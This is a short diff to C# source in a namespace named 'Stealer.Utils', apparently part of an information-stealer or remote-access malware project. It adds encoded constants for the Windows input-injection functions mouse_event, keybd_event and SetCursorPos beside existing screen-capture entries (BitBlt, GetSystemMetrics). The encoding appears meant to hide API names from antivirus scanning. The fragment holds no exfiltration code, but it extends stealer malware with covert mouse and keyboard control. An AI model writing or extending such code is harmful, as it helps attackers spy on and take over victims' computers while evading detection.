@@ -81,6 +81,12 @@ namespace Stealer.Utils
         internal static readonly byte[] Fn_BB = E("BitBlt");
         // GetSystemMetrics
         internal static readonly byte[] Fn_GSM = E("GetSystemMetrics");
+        // mouse_event
+        internal static readonly byte[] Fn_ME = E("mouse_event");
+        // keybd_event
+        internal static readonly byte[] Fn_KE = E("keybd_event");
+        // SetCursorPos
+        internal static readonly byte[] Fn_SCP = E("SetCursorPos");
 
         private static byte[] E(string s)
         {
